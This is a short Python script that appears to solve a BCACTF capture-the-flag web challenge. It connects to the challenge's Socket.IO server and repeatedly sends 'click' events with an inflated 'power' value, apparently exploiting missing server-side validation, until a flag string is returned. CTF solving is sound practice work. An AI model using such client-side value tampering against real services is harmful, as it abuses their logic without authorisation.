import json
import socketio
 
#sio = socketio.SimpleClient(logger=True, engineio_logger=True)
sio = socketio.SimpleClient()
sio.connect("http://challs.bcactf.com:31386/socket-io") 

sio.emit('chat message', "Hello World!")
event = sio.receive()
print(f'Test Event Recieved: "{event[0]}" with arguments {event[1:]}')
 
sid_value = 0 
power = 1e21
while True:
    sio.emit('click', json.dumps({"power":power, "value":sid_value}) )
    event = sio.receive()
    flag = json.loads(event[1:][0])["value"]   
    print(f'Click Response: "{event[0]}" with {event[1:][0]} | Current Sid Value: {sid_value}') 

    try:
        if flag.startswith("bcactf"):
            print(f"Flag: {flag}")
            exit()
    except AttributeError:
        pass

